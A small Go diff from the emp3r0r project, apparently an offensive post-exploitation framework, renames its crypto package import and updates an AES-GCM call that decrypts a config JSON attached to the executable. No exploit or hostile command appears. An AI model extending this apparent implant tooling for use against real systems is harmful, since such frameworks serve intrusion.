@@ -7,8 +7,8 @@ import (
 	"os"
 	"runtime"
 
-	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	"github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_crypto"
 )
 
 // EXE_MEM_FILE save the whole executable
@@ -38,7 +38,7 @@ func ExtractData() (data []byte, err error) {
 
 func VerifyConfigData(data []byte) (jsonData []byte, err error) {
 	// decrypt attached JSON file
-	jsonData, err = crypto.AES_GCM_Decrypt(emp3r0r_data.OneTimeMagicBytes, data)
+	jsonData, err = emp3r0r_crypto.AES_GCM_Decrypt(emp3r0r_data.OneTimeMagicBytes, data)
 	if err != nil {
 		err = fmt.Errorf("Decrypt config JSON failed (%v), invalid config data?", err)
 		return
